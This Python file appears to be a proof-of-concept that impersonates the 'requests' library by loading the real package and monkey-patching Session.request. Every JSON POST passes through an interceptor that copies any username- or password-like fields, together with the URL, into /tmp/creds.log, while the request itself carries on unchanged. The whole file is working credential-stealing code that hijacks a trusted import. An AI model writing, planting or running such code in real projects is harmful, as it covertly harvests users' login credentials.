from pathlib import Path
import importlib
import importlib.util
import importlib.machinery
import json 
import sys
import os

# remove our own directory from sys.path temporarily
current_dir = str(Path(os.path.dirname(__file__)).parent)
if current_dir in sys.path:
    sys.path.remove(current_dir)

# import the real requests module
spec = importlib.machinery.PathFinder.find_spec("requests")
module = importlib.util.module_from_spec(spec)

# register to the sys.module
sys.modules["requests"] = module
spec.loader.exec_module(module)

# patch it
__o_fnc_requests_request = module.Session.request
def interceptor(self, method, url, *args, **kwargs):
    try:
        print("[!] intercept request")
        if method.lower() == "post" and "json" in kwargs:
            payload = kwargs["json"]
            if isinstance(payload, dict):
                creds = {k: payload[k] for k in payload if "user" in k.lower() or "pass" in k.lower()}
                if creds:
                    with open("/tmp/creds.log", "a") as f:
                        f.write(json.dumps({
                            "url": url,
                            "creds": creds,
                        }) + "\n")
    except Exception:
        print("[!] error during execution")
        pass 
    
    return __o_fnc_requests_request(self, method, url, *args, **kwargs)

module.Session.request = interceptor

# put the path back
sys.path.insert(0, current_dir)